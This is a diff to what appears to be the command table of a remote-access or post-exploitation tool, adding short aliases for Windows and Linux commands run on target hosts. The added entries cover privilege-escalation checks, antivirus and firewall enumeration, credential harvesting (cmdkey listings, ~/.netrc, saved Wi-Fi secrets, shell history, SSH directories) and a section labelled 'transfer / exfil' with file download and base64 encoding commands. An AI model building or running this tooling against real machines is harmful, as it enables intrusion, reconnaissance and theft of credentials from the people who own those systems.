@@ -50,16 +50,47 @@ next_id = 1
 
 # name -> {"windows": cmd, "linux": cmd}. Use {0},{1},... for positional args.
 aliases = {
-    "whoami":    {"windows": "whoami /all",                  "linux": "id"},
-    "sysinfo":   {"windows": "systeminfo",                   "linux": "uname -a; cat /etc/os-release"},
-    "net":       {"windows": "ipconfig /all",                "linux": "ip a"},
-    "ps":        {"windows": "Get-Process",                  "linux": "ps aux"},
-    "ports":     {"windows": "netstat -ano",                 "linux": "ss -tulpn"},
-    "users":     {"windows": "net user",                     "linux": "cat /etc/passwd"},
-    "admins":    {"windows": "net localgroup administrators", "linux": "cat /etc/group | grep -E 'sudo|wheel'"},
-    "privesc":   {"windows": "whoami /priv",                 "linux": "sudo -l; find / -perm -4000 -type f 2>/dev/null"},
-    "tasks":     {"windows": "schtasks /query /fo LIST",     "linux": "crontab -l; ls -la /etc/cron*"},
-    "dl":        {"windows": "iwr -Uri {0} -OutFile {1}",    "linux": "curl -fsSL {0} -o {1}"},
+    # identity / privilege
+    "whoami":    {"windows": "whoami /all",                                                         "linux": "id"},
+    "privesc":   {"windows": "whoami /priv",                                                        "linux": "sudo -l; find / -perm -4000 -type f 2>/dev/null"},
+
+    # system info
+    "sysinfo":   {"windows": "systeminfo",                                                          "linux": "uname -a; cat /etc/os-release"},
+    "env":       {"windows": "set",                                                                 "linux": "env"},
+    "drives":    {"windows": "wmic logicaldisk get name,size",                                      "linux": "df -h"},
+    "services":  {"windows": "sc query type= running",                                              "linux": "systemctl list-units --type=service --state=running"},
+    "installed": {"windows": "wmic product get name,version",                                       "linux": "dpkg -l"},
+    "av":        {"windows": "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname", "linux": "which clamscan; systemctl status clamav-daemon 2>/dev/null"},
+    "tasks":     {"windows": "schtasks /query /fo LIST",                                            "linux": "crontab -l; ls -la /etc/cron*"},
+
+    # network
+    "net":       {"windows": "ipconfig /all",                                                       "linux": "ip a"},
+    "arp":       {"windows": "arp -a",                                                              "linux": "arp -n"},
+    "routes":    {"windows": "route print",                                                         "linux": "ip route"},
+    "ports":     {"windows": "netstat -ano",                                                        "linux": "ss -tulpn"},
+    "firewall":  {"windows": "netsh advfirewall show all",                                          "linux": "iptables -L -n"},
+    "shares":    {"windows": "net share",                                                           "linux": "showmount -e"},
+    "hosts":     {"windows": "type C:\\Windows\\System32\\drivers\\etc\\hosts",                     "linux": "cat /etc/hosts"},
+
+    # users / accounts
+    "users":     {"windows": "net user",                                                            "linux": "cat /etc/passwd"},
+    "admins":    {"windows": "net localgroup administrators",                                       "linux": "cat /etc/group | grep -E 'sudo|wheel'"},
+    "creds":     {"windows": "cmdkey /list",                                                        "linux": "cat ~/.netrc 2>/dev/null"},
+    "wifi":      {"windows": "netsh wlan show profiles",                                            "linux": "nmcli -s connection show"},
+
+    # process / activity
+    "ps":        {"windows": "Get-Process",                                                         "linux": "ps aux"},
+    "history":   {"windows": "Get-History",                                                         "linux": "cat ~/.bash_history"},
+
+    # filesystem
+    "pwd":       {"windows": "cd",                                                                  "linux": "pwd"},
+    "ls":        {"windows": "dir",                                                                 "linux": "ls -la"},
+    "ssh":       {"windows": "dir %userprofile%\\.ssh",                                             "linux": "ls ~/.ssh"},
+
+    # transfer / exfil
+    "dl":        {"windows": "iwr -Uri {0} -OutFile {1}",                                          "linux": "curl -fsSL {0} -o {1}"},
+    "download":  {"windows": "iwr -Uri {0} -OutFile {1}",                                          "linux": "curl -fsSL {0} -o {1}"},
+    "b64enc":    {"windows": "certutil -encode {0} con",                                            "linux": "base64 {0}"},
 }
 lock = threading.Lock()
 log_lock = threading.Lock()
